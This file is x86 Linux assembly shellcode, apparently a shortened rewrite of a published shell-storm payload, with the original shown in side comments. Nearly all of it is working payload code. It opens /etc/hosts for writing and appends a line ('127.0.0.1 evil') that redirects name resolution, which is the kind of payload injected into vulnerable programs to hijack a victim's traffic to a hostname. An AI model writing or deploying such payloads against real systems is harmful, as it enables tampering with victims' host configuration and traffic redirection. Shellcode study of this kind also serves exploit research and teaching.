;my version(75 bytes)				original(77 bytes):http://shell-storm.org/shellcode/files/shellcode-893.php														
section .text								
global _start

_start:

jmp short get_cfg										
up:												
 xor eax,eax					;xor ecx, ecx
 ;save the string in esi			;mul ecx
 pop esi       					;mov al, 0x5 
 ;set the file to edit /etc/hosts in ebx 	;push ecx
 mov ebx,esi					;push 0x7374736f     ;/etc///hosts
 ;null terminating the file name 		;push 0x682f2f2f
 mov byte [ebx+10],al   			;push 0x6374652f
 mov al, 0x5 ;open				;mov ebx, esp
 mov cl, 0x2 ;read and write mode		;mov cx, 0x401   ;permmisions
 int 0x80					;int 0x80        ;syscall to open file
 ;save the fd returned from the open call
 mov ebx,eax            			;xchg eax, ebx
 mov al, 0x4 ;the sys write call		;push 0x4
 xor edx,edx					;pop eax
 ;now we put value $0x09 into dl...		;jmp short _load_data    ;jmp-call-pop technique to load the map
 mov dl,0x09					;_write:
 ;0x09+1=0x0A get the bad line feed char 	;pop ecx
 inc  dl					;push 20 ;length of the string, dont forget to modify if changes the map
 ;set the carriag ret at the end of the string	;pop edx
 mov byte [esi+25],dl				;int 0x80 ;syscall to write the file
 ;get the string to write 			;push 0x6
 ;to the file 127.0.0.1 evil\n 			;pop eax
 lea ecx,[esi+11]       			;int 0x80 ;syscall to close the file
 mov dl,15 ;len of the buffer to write		;push 0x1
 int 0x80					;pop eax
 mov al,0x6 ;close file				;int 0x80 ;syscall to exit
 int 0x80					;_load_data
 mov al,0x1 ;exit				;call write
 int 0x80					;google db "127.1.1.1 google.com"
get_cfg:
 call up
 db "/etc/hostsZ127.0.0.1 evilZ"
 
 
